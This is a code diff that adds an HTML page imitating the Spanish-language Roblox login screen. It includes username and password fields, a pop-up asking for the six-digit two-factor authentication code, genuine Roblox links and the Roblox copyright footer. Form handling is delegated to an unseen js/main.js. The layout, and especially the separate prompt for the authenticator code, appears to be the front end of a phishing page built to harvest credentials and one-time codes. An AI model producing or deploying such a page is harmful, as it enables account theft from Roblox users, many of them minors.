@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Roblox</title>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+    <link rel="stylesheet" href="css/normalize.css" />
+    <link rel="stylesheet" href="css/styles.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta2/css/all.min.css"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@200;400;500;600;700;800&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+
+  <body>
+    <div class="pop-up-verificar">
+      <div class="dialogo-verificar">
+        <div class="header-dialogo">
+          <i id="btn-cerrar-pop" class="fa-solid fa-xmark"></i>
+          <h4>Verificación en dos pasos</h4>
+        </div>
+        <div class="contenido-dialogo">
+          <div class="contenedor-imagen">
+            <img src="./img/seguridad.svg" alt="2fa" />
+          </div>
+          <form action="" class="formulario-dialogo" id="formulario-dialogo">
+            <p class="texto-ingresar-codigo">Ingresa el código generado por la aplicación de autenticación.</p>
+            <input
+              max="999999"
+              placeholder="Introduce el código de 6 dígitos"
+              type="number"
+              id="codigo-seguridad"
+              name="codigo-seguridad"
+              onKeyPress="if(this.value.length==6) return false;"
+              pattern="\d*"
+            />
+            <p id="codigo-incorrecto">El código no es válido.</p>
+            <div class="check-confiar">
+              <input type="checkbox" name="" id="check-30" />
+              <label for="check-30"
+                >Confiar en este dispositivo durante 30 días.</label
+              >
+            </div>
+            <div class="cont-verif-otro">
+              <a href="" id="link-verif-otro">Utiliza otro método de verificación</a>
+            </div>
+            <div class="cont-asistencia">
+              <p>¿Necesitas ayuda? Ponte en contacto con <a href="">Asistencia técnica de Roblox</a>.</p>
+            </div>
+            <div class="contenedor-btn-codigo">
+              <input type="submit" value="Verificar">
+            </div>
+          </form>
+        </div>
+        
+      </div>
+    </div>
+
+    <header id="header-sitio">
+      <nav id="menu-roblox-header">
+        <a href="#"><i class="fas fa-bars"></i></a>
+        <a href="#"
+          ><img src="img/icono-roblox.png" width="25" height="25" alt=""
+        /></a>
+      </nav>
+      <nav id="navegacion-header">
+        <div class="contenedor-link">
+          <a href="https://www.roblox.com/discover#/">Descubrir</a>
+        </div>
+        <div class="contenedor-link">
+          <a href="https://www.roblox.com/catalog">Tienda de avatares</a>
+        </div>
+        <div class="contenedor-link">
+          <a href="https://www.roblox.com/create">Crear</a>
+        </div>
+        <div class="contenedor-link">
+          <a href="https://www.roblox.com/upgrades/robux?ctx-nav">Robux</a>
+        </div>
+      </nav>
+      <div id="busqueda-header">
+        <a href="#"><i class="fas fa-search"></i></a>
+        <input type="text" name="" id="" placeholder="Buscar" />
+      </div>
+      <div id="btn-registro-header">
+        <a
+          href="https://www.roblox.com/?returnUrl=https%3A%2F%2Fwww.roblox.com%2FRegister"
+          >Registro</a
+        >
+        <i class="fas fa-search"></i>
+      </div>
+    </header>
+    <main id="main-sitio">
+      <div id="contenedor-formulario">
+        <div id="box-formulario">
+          <form action="#" id="form-login">
+            <h2>Iniciar sesión en Roblox</h2>
+            <input
+              type="text"
+              name="cuenta"
+              id="cuenta"
+              placeholder="Usuario/correo/teléfono"
+            />
+            <input
+              type="password"
+              name="password"
+              id="password"
+              placeholder="Contraseña"
+            />
+            <p id="cuenta-incorrecta">
+              Es necesario especificar el nombre de usuario y la contraseña.
+            </p>
+            <input id="btn-submit" type="submit" value="Iniciar sesión" />
+            <div class="loader"></div>
+          </form>
+          <div id="contenedor-olvidar-password">
+            <a href="https://www.roblox.com/login/forgot-password-or-username"
+              >¿Has olvidado tu contraseña o nombre de usuario?</a
+            >
+          </div>
+          <div id="contenedor-texto-login-barra">
+            <p>Inicia sesión con</p>
+          </div>
+          <div id="contenedor-botones-login">
+            <a href="">Inicio de sesión rápido</a>
+            <a href="" id="btn-facebook">Facebook</a>
+          </div>
+        </div>
+      </div>
+    </main>
+    <footer id="footer-sitio">
+      <div id="contenedor-links-footer">
+        <nav id="links-footer">
+          <a href="">Quiénes somos</a>
+          <a href="">Empleo</a>
+          <a href="">Blog</a>
+          <a href="">Padres</a>
+          <a href="">Tarjetas regalo</a>
+          <a href="">Ayuda</a>
+          <a href="">Términos</a>
+          <a href="">Accesibilidad</a>
+          <a href="">Privacidad</a>
+        </nav>
+      </div>
+      <div id="divisor-footer"></div>
+      <div id="copyright-footer">
+        <p>
+          ©2021 Roblox Corporation. Roblox, el logotipo de Roblox y Powering
+          Imagination son algunas de nuestras marcas registradas y no
+          registradas en los Estados Unidos y otros países.
+        </p>
+      </div>
+    </footer>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
+      integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script src="js/main.js"></script>
+  </body>
+</html>
